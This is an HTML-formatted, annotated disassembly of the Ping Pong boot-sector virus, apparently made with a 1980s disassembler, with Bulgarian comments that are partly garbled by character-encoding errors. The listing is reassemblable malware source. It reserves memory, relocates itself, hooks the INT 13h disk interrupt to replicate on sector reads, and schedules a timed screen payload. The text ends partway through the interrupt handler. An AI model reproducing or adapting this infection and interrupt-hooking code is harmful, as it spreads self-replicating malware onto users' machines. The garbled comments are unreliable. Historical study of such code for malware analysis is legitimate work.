<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>PINGPONG.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;   Advanced Fullscreen Disassembler v2.11</span><span class="sc0">
</span><span class="sc1">;   Copyright (C) by Rumen Gerasimov (GERISOFT), 1987, 1988</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   First listing: without DATA segment</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Segment value: 0000, length: 0200</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">BIOS_SEG</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">
</span><span class="sc5">D0020</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">D0022</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">INTERR8</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">far</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">004Ch</span><span class="sc0">
</span><span class="sc5">D004C</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">D004E</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0413h</span><span class="sc0">
</span><span class="sc5">D0413</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BIOS_SEG</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">BOOT_SEG</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0">  </span><span class="sc2">7Ch</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BOOT_PROCESS</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0">
</span><span class="sc5">BOOT_SEG</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">DISK_ROM</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0">  </span><span class="sc2">0C800h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">256h</span><span class="sc0">
</span><span class="sc5">C800_SEG</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">far</span><span class="sc0">
</span><span class="sc5">DISK_ROM</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">





</span><span class="sc5">SEG0000</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc10">para</span><span class="sc0">    </span><span class="sc12">'CODE'</span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">SEG0000</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">SEG0000</span><span class="sc0">

</span><span class="sc1">;***********************************************************;</span><span class="sc0">
</span><span class="sc1">;         ПЪРВИ СЕКТОР - НАЧАЛО НА ВИРУСА           ;</span><span class="sc0">
</span><span class="sc1">;        НАМИРА СЕ НА boot sector НА ДИСКА          ;</span><span class="sc0">
</span><span class="sc1">;***********************************************************;</span><span class="sc0">
</span><span class="sc1">;  Т│к ад░е▒║▓ е 0000:7C00 или 07C0:0000</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">7C00h</span><span class="sc0">

    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">L7C1E</span><span class="sc0">

</span><span class="sc5">D7C02</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'IBM  3.1'</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">D7C0D</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">D7C0E</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">70h</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">D7C13</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">2D0h</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0FDh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">D7C18</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc0">   </span><span class="sc1">;Sector per track - SecPTrk</span><span class="sc0">
</span><span class="sc5">D7C1A</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">;Side per track   - SidPTrk</span><span class="sc0">
</span><span class="sc5">D7C1C</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">L7C1E</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">

    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">BIOS_SEG</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D0413</span><span class="sc0">   </span><span class="sc1">;Намал┐ва BIOS MEMSIZE ▒ 2</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D0413</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">SEG0000</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">07C0h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;ES: ▒егмен▓а на зае▓и▓е 2К паме▓</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0"> </span><span class="sc6">MOVSW</span><span class="sc0">          </span><span class="sc1">;ме▒▓и ▒е ▓ам: ╢ели┐▓ ▒ек▓о░</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">08Eh</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">   </span><span class="sc1">;MOV     CS,AX  ;п░едава │п░авление▓о на ново▓о м┐▒▓о</span><span class="sc0">
                    </span><span class="sc1">;CS:7C00 - ад░е▒ на на╖ало▓о на кода</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">L7C4A</span><span class="sc0">

</span><span class="sc5">L7C4A</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">;RESET на INT 13</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF8</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">;У▒▓░ой▒▓во▓о е п║░ви ди▒к (A: - floppy</span><span class="sc0">
                    </span><span class="sc1">;               C: - hard</span><span class="sc0">


    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF9</span><span class="sc0">   </span><span class="sc1">;Че▓е п║░ви┐▓ ▒ек▓о░, к║де▓о е п░од║л-</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">;жение▓о</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0020h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;adres = (CS - 20h):8000h</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">L7C9D</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF9</span><span class="sc0">   </span><span class="sc1">;Че▓е в▓о░и┐▓ ▒ек▓о░ о▓ п░од║лжение▓о</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; (но░мални┐▓ BOOT)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FFC0h</span><span class="sc0">       </span><span class="sc1">;adres = 0000:7C00</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">L7C9D</span><span class="sc0">

    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">   </span><span class="sc1">;Чи▒▓и ▒▓а▓│▒-бай▓а (за по▒ле)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">

    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">BIOS_SEG</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D004C</span><span class="sc0">   </span><span class="sc1">;Зака╖ва ▒е за INT 13!</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D004E</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D004C</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewINT13</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D004E</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">SEG0000</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7D2A</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">;Запазва ▒▓а░и┐▓ ад░е▒ на INT 13</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7D2C</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF8</span><span class="sc0">   </span><span class="sc1">;Взема │▒▓░ой▒▓во▓о за BOOT и ▒▓а░▓и░а</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">BOOT_PROCESS</span><span class="sc0">        </span><span class="sc1">;но░мални┐▓ BOOT process</span><span class="sc0">



</span><span class="sc1">;================================================================;</span><span class="sc0">
</span><span class="sc1">;     ПРОГРАМА ЗА ЧЕТЕНЕ  (L7C9D) И ЗАПИС (L7C98)        ;</span><span class="sc0">
</span><span class="sc1">;        НА ЛОГИЧЕСКИ СЕКТОР ОТ ДИСК             ;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;  BX - ▒ек▓о░ о▓но▒но на╖ало▓о, кой▓о ▓░┐бва да ▒е п░о╖е▓е  ;</span><span class="sc0">
</span><span class="sc1">;  ES:8000 - ад░е▒, к║де▓о да ▒е п░о╖е▓е ▒ек▓о░║▓        ;</span><span class="sc0">
</span><span class="sc1">;                                ;</span><span class="sc0">
</span><span class="sc1">;  D7DF8   - │▒▓░ой▒▓во, о▓ кое▓о ╖е▓е               ;</span><span class="sc0">
</span><span class="sc1">;                                ;</span><span class="sc0">
</span><span class="sc1">;================================================================;</span><span class="sc0">
</span><span class="sc5">L7C98</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">L7CA0</span><span class="sc0">

</span><span class="sc5">L7C9D</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
</span><span class="sc5">L7CA0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7C1C</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">

    </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7C18</span><span class="sc0">      </span><span class="sc1">;п░ев░║╣а логи╖е▒ки┐▓ ▒ек▓о░ в AX</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">          </span><span class="sc1">; (0-7..) в║в Track, Side, Sector</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">           </span><span class="sc1">;в ░еги▒▓░и▓е CX, DX (за INT 13)</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7C1A</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">L7CC3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF8</span><span class="sc0">   </span><span class="sc1">;взема номе░а на ди▒ка за ╖е▓ене (A:)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">8000h</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
    </span><span class="sc6">JNC</span><span class="sc0"> </span><span class="sc5">L7CCF</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">;▒капва ▒▓ека и загива, ако има I/O err</span><span class="sc0">
</span><span class="sc5">L7CCF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RET</span><span class="sc0">



</span><span class="sc1">;========================================================================;</span><span class="sc0">
</span><span class="sc1">;   ТАЗИ ПРОГРАМА СЕ ВРЪЗВА НА МЯСТОТО НА ИСТИНСКИЯТ  INT 13     ;</span><span class="sc0">
</span><span class="sc1">;========================================================================;</span><span class="sc0">
</span><span class="sc5">NewINT13</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">;Запазва ░еги▒▓░и▓е</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">;Оп░ав┐ ▒во┐ DS и ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;Ако е 1 - в║зп░оизвеждане на ви░│▒а,</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7D23</span><span class="sc0">           </span><span class="sc1">; о▓ива да пи╕е ▒║▒ ▒▓анда░▓. INT 13</span><span class="sc0">

    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">;Че▓ене на ▒ек▓о░?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7D23</span><span class="sc0">           </span><span class="sc1">;Не, п░од║лжава ▒║▒ ▒▓анда░▓ни┐▓ INT 13</span><span class="sc0">

    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF8</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">   </span><span class="sc1">;У▒▓░ой▒▓во▓о ▒║впада ▒ по▒ледно▓о</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF8</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">   </span><span class="sc1">; ▒ кое▓о е ░або▓ено</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7D12</span><span class="sc0">           </span><span class="sc1">;Не</span><span class="sc0">

    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">;Взема в░еме▓о</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">          </span><span class="sc1">;би▓ 8000 на low order part = 1?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7D03</span><span class="sc0">           </span><span class="sc1">;да, п░е▒ка╖а</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">         </span><span class="sc1">;би▓ове 00F0 на low order part = 1?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7D03</span><span class="sc0">           </span><span class="sc1">;да, п░е▒ка╖а</span><span class="sc0">
                </span><span class="sc1">;П░о┐ва: кога▓о TIMER .and. 80F0h == 0</span><span class="sc0">
                </span><span class="sc1">;П░иблизи▓елно на 1800 ▒ек. = 30 мин.</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">L7EB3</span><span class="sc0">           </span><span class="sc1">;П░о┐ва на ви░│▒а - ▒ка╖а по ек░ана</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">L7D03</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">;Оп░едел┐ ▓░┐бва ли да за░аз┐ва</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7EB0</span><span class="sc0">   </span><span class="sc1">; (под╡од┐╣ момен▓ в░еме)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7EB0</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">24h</span><span class="sc0">
    </span><span class="sc6">JC</span><span class="sc0">  </span><span class="sc5">L7D23</span><span class="sc0">

</span><span class="sc5">L7D12</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;С▓а░▓и░а в║зп░оизвеждане/за░аз┐ване</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">L7D2E</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">

</span><span class="sc5">L7D23</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">;В║з▒▓анов┐ва по▓░еби▓ел▒ки▓е ░еги▒▓░и</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
